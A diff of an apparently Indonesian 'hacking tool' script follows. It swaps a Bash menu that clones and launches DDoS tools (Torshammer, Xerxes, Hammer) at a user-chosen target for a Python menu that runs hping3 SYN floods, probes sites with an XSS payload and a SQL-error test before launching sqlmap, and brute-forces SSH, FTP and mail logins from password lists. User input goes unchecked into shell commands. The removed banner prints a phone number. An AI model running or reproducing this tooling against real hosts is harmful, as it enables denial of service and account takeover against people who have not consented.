@@ -1,283 +1,275 @@
-#!/system/xbin/bash
-#Author InYourDfv47
-#Thanks to
-#Termux Termux Tools-ID
-#Elite Muslim Cyber Army
-#Netral Cyber Team
-#2Easy 4Hack
+# Create python3 
+# Author Ro0T_N3T
+# 
+import urllib.request  as urllib2 
+import re
+import sys,os
+import random
 
-clear
-blue='\033[34;1m'
-green='\033[32;1m'  
-purple='\033[35;1m'
-cyan='\033[36;1m'
-red='\033[31;1m'
-white='\033[37;1m'                                           
-yellow='\033[33;1m'
-NOW=`date "+%d.%m.%Y"`
-TIME=`date "+%H:%M"`
+H = '\033[95m'
+B = '\033[94m'
+G = '\033[92m'
+W = '\033[93m'
+F = '\033[91m'
+E = '\033[0m'
+U = '\033[4m'
+O = '\033[33m'
+ 
+def info():
+	VERSION = B+'1.0'+E
+	AUTHOR =  B+'Bahauddin'+E
+	print("""
+		#################################
+		#                               # 
+		#          Version-> %s        #
+		#                               #
+		#          Author->  %s     # 
+		#                               #
+		#################################
+		""" % (VERSION, AUTHOR))
+def heads():
+	global head
+	head = E+H+"""
+###########################################
+#           Bahauddin Mr.B4h4'            #
+#             $ DDOS ATTACK $             #
+#             $ VERSION 1.0 $             #
+###########################################\033[91m
+# Github : https://github.com/rootnet007  #
+#_____________  Bahauddin  _______________#
++	  AUTHOR : Ro0T N3T               +
++	  Code   : GR3G3T && MR.7u#h1     +
++	  Date   : 09/8/2018              +
+-------------------------------------------
+"""+E
+def banner():
+	text1 = B+"""
+###########################################
+#          Bahauddin Mr.B4h4'             #
+#             $ DDOS ATTACK $             #
+#             $ VERSION 1.0 $             #
+###########################################
+      """+F+'<<<<------'+W+'Bahauddin'+F+'---->>>>'+E
+	text2 = O+"""
+###########################################
+#          Bahauddin Mr.B4h4'             #
+#             $ DDOS ATTACK $             #
+#             $ VERSION 1.0 $             #
+###########################################   
+      """+F+'<<<<---------'+W+'Bahauddin'+F+'--------->>>>'+E+F+'\n     <<<<--------'+W+'Bahauddin'+F+'-------->>>>'+E
+	text3 = F+"""
+###########################################
+#           Bahauddin Mr.B4h4'            #
+#             $ DDOS ATTACK $             #
+#             $ VERSION 1.0 $             #
+###########################################
+	"""+B+'Version ='+W+' 1.0'+E
+	ran = random.randrange(1, 4)
+	if ran == 1:
+		print(text1)
+	elif ran == 2:
+		print(text2)
+	elif ran == 3:
+		print(text3)
 
-echo
-toilet -f standard " Bahauddin " -F gay
-echo
-echo ""
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-echo $green"    Bahauddin - Mr.B4h4'"
-echo $yellow"   Bendokaton Tayu Pati Jateng"
-echo $red"      085726833815"
-echo $white"    SENG PENTING ROKOK KOPI LANCAR"
-echo $purple"   INDONESIAN CYBER TEAM"
-echo $cyan"     KNOWLEDGE IS POWER" 
-echo $green"    NIGHT PEOOPLE"
-echo $yellow"   TERUS BELAJAR TANPA HENTI"
-echo $red"      TOOL HACKING"
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-echo ""
-echo $white"            .:TOOL HACKING DDOS Bahauddin:."
-echo $purple"...........::::::::::Bahauddin::::::::::..........."
-echo $cyan".::Bermimpi lah Setinggi Langit Karena Mimpi itu Gratis:.."
-echo $green"......::::::monggo Pilih Tools seng ono:::::::......"
-echo $yellow
-date 
-echo "\033[36;1m"
-echo "[+]===============================================[+]"
-echo $red"  [1] LITEDDOS               "
-echo "[+]===============================================[+]"
-echo $white"  [2] Torshammer                 "
-echo "[+]===============================================[+]"
-echo $purple"  [3] Xerxes              "
-echo "[+]===============================================[+]"
-echo $cyan"  [4] Hammer                   "
-echo "[+]===============================================[+]"
-echo $purple"  [00] About Me                                    "
-echo "[+]===============================================[+]"
-echo $cyan"  [0] Exit     "
-echo "[+]===============================================[+]"
-echo
-echo "\033[32;1m"
-read -p "╭─[Pilih Nomer]
-╰─root@Bahauddin=•>" bro
+def XXS():
+	os.system('clear')
+	banner()
+	print('Enter site:')
+	try:
+		site = input(B+'hack»XXS»'+E) 
+	except:
+		print(F+'\nError'+E)
+		
+	if "http://" not in site and "https://"not in site:
+		site = 'http://' + site
+	else:
+		pass
+
+	if "id=" not in site:
+		print(F+'[!]'+E+' Site dont have id parametrs')
+	else:
+		print(W+'[*]'+G+' Site '+site+' have "id" param')
+	
+	try:
+		res = urllib2.urlopen(site)
+	except:
+		print(F+'[!] Site not work'+E)
+		exit()
+	
+	try:
+		print(W+'[+]'+G+' Site work'+E)
+		scr = ';<script>alert(111111111111111111111);</script>'
+		site_xxs = site+scr
+		res = urllib2.urlopen(site_xxs)
+		info = res.info()
+		print('################Info################\n')
+		print(info)
+		print('####################################\n')
+		text = res.read()
+
+		if "111111111111111111111" not in str(text):
+			print(F+'[!]'+' Site not have XXs '+E)
+			exit()
+		else:
+			print(U+W+'[++]'+B+' Site '+site +' have xxs vulnerability'+E)
+			print(W+'Payload: '+G+site_xxs+E)
+			sys.exit(1)
+
+	except:
+		print(F+'[!]'+' Fatal Error'+E)
+		exit()
+def desc():
+	print(W+'''    ____        _                     _     _ _       
+ |  _ \      | |                   | |   | (_)      
+ | |_) | __ _| |__   __ _ _   _  __| | __| |_ _ __  
+ |  _ < / _` | '_ \ / _` | | | |/ _` |/ _` | | '_ \ 
+ | |_) | (_| | | | | (_| | |_| | (_| | (_| | | | | |
+ |____/ \__,_|_| |_|\__,_|\__,_|\__,_|\__,_|_|_| |_|
+                                                    
+                                                    
+                           ___________________Bahauddin____________________
+'''+E)
+
+def SQL():
+	os.system('clear')
+	banner()
+	print(G+'Enter site:'+E)
+	site = input(B+'Hunner»SqlScaner»'+E)
+	if "http://" not in site and "https://"not in site:
+		site = 'http://' + site
+	else:
+		pass
+	if "id=" not in site:
+		print(F+'[!]'+E+' Site dont have id parametrs')
+	else:
+		print(W+'[*]'+G+' Site '+site+' have "id" param')
+	try:
+		res = urllib2.urlopen(site)
+		print(W+'[+]'+G+' Site work'+E)
+	except:
+		print(F+'[!]'+E+' Site dont work')
+	try:
+		info = res.info()
+		print('#####################Info#####################')
+		print(info)
+		print('##############################################')
+		bad_site = site+'\'\"'
+		res = urllib2.urlopen(bad_site)
+		text = res.read()
+		if 'You have an error in your SQL syntax' not in str(text):
+			print(W+'[--]'+F+' Site '+site+' not have Sql Error'+E)
+		else:
+			print(W+'[++]'+H+' Site '+F+site+H+' have SQL Error '+E)
+			print('Start sqlmap ?')
+			y = input('Y/n->')
+			if y == "Y" or y == 'y':
+				os.system('sqlmap -u '+site+' --dbs')
+			else:
+				print(W+'<< Good by >> '+E)
+	except:
+		print(F+'Fatal error'+E)
 
 
+def Dos():
+	os.system('clear')
+	banner()
+	print('Target Url:Contoh --> www.target.com')
+	site = input(B+'Bahauddin~:# '+E)
+	print('''Serang Nomor ->> 1 atau 2)''')
+	level = int(input(B+'Ro0T@N3T~:# '+E))
+	if level == 3:
+		os.system('hping3 -S -P --flood -V '+site)
+	if level == 2:
+		port = input(B+'Bahauddin»Dos»Level»Port»'+E)
+		os.system('hping3 -S -P --flood -V -p '+port+' '+ site)
+	if level == 1:
+		os.system('python3 AcehCyberTeam/act.py '+site)
 
-if [ $bro = 1 ] || [ $bro = 1 ]
-then
-clear
-echo
-toilet -f standard " Bahauddin " -F gay
-echo
-echo ""
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-echo $green"    Bahauddin - Mr.B4h4'"
-echo $yellow"   Bendokaton Tayu Pati Jateng"
-echo $red"      085726833815"
-echo $white"    SENG PENTING ROKOK KOPI LANCAR"
-echo $purple"   INDONESIAN CYBER TEAM"
-echo $cyan"     KNOWLEDGE IS POWER" 
-echo $green"    NIGHT PEOOPLE"
-echo $yellow"   TERUS BELAJAR TANPA HENTI"
-echo $red"      TOOL HACKING"
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-sleep 1
-echo $green"Installing LITEDDOS..."
-sleep 1
-apt update
-apt install git
-git clone https://github.com/4L13199/LITEDDOS
-mv LITEDDOS $HOME
-cd $HOME/LITEDDOS
-read -p "MasukanTarget:" target
-python2 LITEDDOS.py target 80 100
-fi
+def SSH_Brut():
+	os.system('clear')
+	banner()
+	try:
+		print(F+'Brutforse ssh mode!!'+E)
+		print('Enter target host:')
+		host = input(W+'Hunner»SSH»Host»'+E)
+		print(G+'Enter username:'+E)
+		print(G+'Default: admin'+E)
+		user = input(W+'Hunner»SSH»User»'+E)
+		if user == "":
+			user = 'admin'
+		print(G+'Enter password file:'+E)
+		password = input(W+'Hunner»SSH»Password»'+E)
 
-if [ $bro = 2 ] || [ $bro = 2 ]
-then
-clear
-echo
-toilet -f standard " Bahauddin " -F gay
-echo
-echo ""
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-echo $green"    Bahauddin - Mr.B4h4'"
-echo $yellow"   Bendokaton Tayu Pati Jateng"
-echo $red"      085726833815"
-echo $white"    SENG PENTING ROKOK KOPI LANCAR"
-echo $purple"   INDONESIAN CYBER TEAM"
-echo $cyan"     KNOWLEDGE IS POWER" 
-echo $green"    NIGHT PEOOPLE"
-echo $yellow"   TERUS BELAJAR TANPA HENTI"
-echo $red"      TOOL HACKING"
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-sleep 1
-echo $green"Installing Torshammer DDOS..."
-sleep 1
-apt update
-apt install git
-apt install tor
-git clone https://github.com/dotfighter/torshammer.git
-mv torshammer $HOME
-cd $HOME/torshammer
-read -p "Masukan Target:" target
-python2 torshammer.py -T -t target
-fi
+		if password == "":
+			print('Enter password file')
+			sys.exit(1)
+		os.system('python3 modules/ssh.py '+host+' '+user+' '+password)
+	except:
+		print(F+' User aborting !!')
+		exit()
 
-if [ $bro = 3 ] || [ $bro = 3 ]
-then
-clear
-echo
-toilet -f standard " Bahauddin " -F gay
-echo
-echo ""
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-echo $green"    Bahauddin - Mr.B4h4'"
-echo $yellow"   Bendokaton Tayu Pati Jateng"
-echo $red"      085726833815"
-echo $white"    SENG PENTING ROKOK KOPI LANCAR"
-echo $purple"   INDONESIAN CYBER TEAM"
-echo $cyan"     KNOWLEDGE IS POWER" 
-echo $green"    NIGHT PEOOPLE"
-echo $yellow"   TERUS BELAJAR TANPA HENTI"
-echo $red"      TOOL HACKING"
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-sleep 1
-echo $green"Installing Xerxes DDOS..."
-sleep 1
-apt update && apt upgrade
-apt install git
-apt install clang
-git clone https://github.com/zanyarjamal/xerxes
-mv xerxes $HOME
-cd $HOME/xerxes
-clang xerxes.c -o xerxes
-clear
-read -p "[masukanWebsiteTarget]>" target
-./xerxes target 80
-fi
 
-if [ $bro = 4 ] || [ $bro = 4 ]
-then
-clear
-echo
-toilet -f standard " Bahauddin " -F gay
-echo
-echo ""
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-echo $green"    Bahauddin - Mr.B4h4'"
-echo $yellow"   Bendokaton Tayu Pati Jateng"
-echo $red"      085726833815"
-echo $white"    SENG PENTING ROKOK KOPI LANCAR"
-echo $purple"   INDONESIAN CYBER TEAM"
-echo $cyan"     KNOWLEDGE IS POWER" 
-echo $green"    NIGHT PEOOPLE"
-echo $yellow"   TERUS BELAJAR TANPA HENTI"
-echo $red"      TOOL HACKING"
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-sleep 1
-echo $green" Installing Hammer DDOS.."
-sleep 1
-git clone https://github.com/cyweb/hammer
-mv hammer $HOME
-cd $HOME/hammer
-read -p "Masukan Target:" target
-python2 hammer.py -T -t target
-fi
+def FTP_Brut():
+	os.system('clear')
+	banner()
+	print(F+'Brutforse ftp mode!!'+E)
+	print(B+'Enter host:'+E)
+	host = input(W+'Hunner»Ftp»Host»'+E)
+	print(B+'Enter user:'+E)
+	print(F+'Default: admin')
+	user = input(W+'Hunner»Ftp»User»'+E)
+	print(B+'Enter password file:'+E)
+	password_list = input(W+'Hunner»Ftp»Password»'+E)
+	if user == '':
+		user = 'admin'
+	if password_list == '':
+		print('Enter password list')
+		sys.exit(1)
+	os.system('python3 modules/ftp.py '+host+' '+user+' '+password_list)
 
-if [ $bro = 00 ] || [ $bro = 00 ]
-then
-clear
-echo
-toilet -f standard " InYourDfv47 " -F gay
-echo
-echo ""
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-echo $green"    Bahauddin - Mr.B4h4'"
-echo $yellow"   Bendokaton Tayu Pati Jateng"
-echo $red"      085726833815"
-echo $white"    SENG PENTING ROKOK KOPI LANCAR"
-echo $purple"   INDONESIAN CYBER TEAM"
-echo $cyan"     KNOWLEDGE IS POWER" 
-echo $green"    NIGHT PEOOPLE"
-echo $yellow"   TERUS BELAJAR TANPA HENTI"
-echo $red"      TOOL HACKING"
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-sleep 1
-echo $green"_ ▂ ▄ ▅ ▆ ▆ ▆ ▆ ▆ [ ABOUT ME ] ▆ ▆ ▆ ▆ ▆ ▆ ▅ ▄ ▂ _"
-sleep 1
-echo $yellow"Hello Every One"
-sleep 1
-echo $red"I'm Bahauddin"
-sleep 1
-echo $white"TOOL HACKING"
-sleep 1
-echo $purple"Team Cyber :"
-sleep 1
-echo $cyan"INDONESIAN CYBER TEAM"
-echo $green""
-echo $yellow""
-sleep 1
-echo $red"We Are From INDONESIAN CYBER TEAM"
-echo $white"###########################################"
-sleep 1
-echo $purple"Since 22 July 2018"
-echo $white"###########################################"
-sleep 1
-echo $cyan"The Leader Is :"
-echo $white"###########################################"
-sleep 1
-echo $green"Bahauddin And Mr.B4h4'"
-echo $white"###########################################"
-sleep 1
-echo $purple"Thanks To All My Friends :"
-echo $white"###########################################"
-sleep 1
-echo $green"    Bahauddin - Mr.B4h4'"
-echo $yellow"   Bendokaton Tayu Pati Jateng"
-echo $red"      085726833815"
-echo $white"    SENG PENTING ROKOK KOPI LANCAR"
-echo $purple"   INDONESIAN CYBER TEAM"
-echo $cyan"     KNOWLEDGE IS POWER" 
-echo $green"    NIGHT PEOOPLE"
-echo $yellow"   TERUS BELAJAR TANPA HENTI"
-echo $red"      TOOL HACKING"
-echo $white"###########################################"
-sleep 1
-echo $green"We Are INDONESIAN CYBER TEAM"
-sleep 1
-echo $yellow"We Learn Code"
-sleep 1
-echo $red"We Learn Programming"
-sleep 1
-echo $purple"Expect Us And"
-sleep 1
-echo $cyan"Respect Us"
-fi
-if [ $bro = 0 ] || [ $bro = 0 ]
-then
-echo $cyan"Thanks Use My Tools"
-sleep 1
-echo $green"We Are INDONESIAN CYBER TEAM"
-sleep 1
-echo $yellow"We Learn Code"
-sleep 1
-echo $red"We Learn Programming"
-sleep 1
-echo $white"Expect Us"
-sleep 1
-echo $purple"And"
-sleep 1
-echo $cyan"Respect Us"
-sleep 1
-echo $green"Bermimpi Setinggi Langit Karena Mimpi Itu Gratis"
-sleep 1
-echo $yellow"Dan Berusahalah Untuk Mencapai Mimpimu Tersebut Walaupun Mustahil"
-sleep 1
-echo $red"Namun Jika Kamu Bersungguh Sungguh Maka Mimpi Yang Mustahil Tersebut Akan Tercapai Juga"
-sleep 1
-echo $white"This Tools Is Exit"
-echo $red"3......"
-sleep 1
-echo $red"2......"
-sleep 1
-echo $red"1......"
-exit
-fi
+
+def mail():
+	os.system('clear')
+	banner()
+	print(H+'Brut mail account'+E)
+	print(B+'Enter login:'+E)
+	mail = input(W+'Hunner»Mail»Login»'+E)
+	print(B+'Enter password list:'+E)
+	password = input(W+'Hunner»Mail»Password»'+E)
+	if password == '':
+		print(F+'Password list: password/password_list.txt'+E)
+		password = 'password/password_list.txt'
+	os.system('python3 modules/mail.py '+mail+' '+password)
+
+def Main_Menu():
+	print(head)
+	desc()
+	print('\n')
+	print(B+'''Masukan Angka -> (1) ?
+'''+W+'''----------------------'''+E)
+	try:
+		v = input('Bahauddin~:# ')
+	except:
+		print(' Bahauddin ')
+		exit()
+	
+	if v == 'help':
+		info()
+	elif int(v) == 4:
+		XXS()
+	elif int(v) == 2:
+		SQL()
+	elif int(v) == 1:
+		Dos()
+	elif int(v) == 3:
+		FTP_Brut()
+	elif int(v) == 5:
+		SSH_Brut()
+	elif int(v) == 6:
+		mail()
+	else:
+		print(F+'[!]'+' You entered an incorrect value '+E)
+		exit()
+heads()
+Main_Menu()
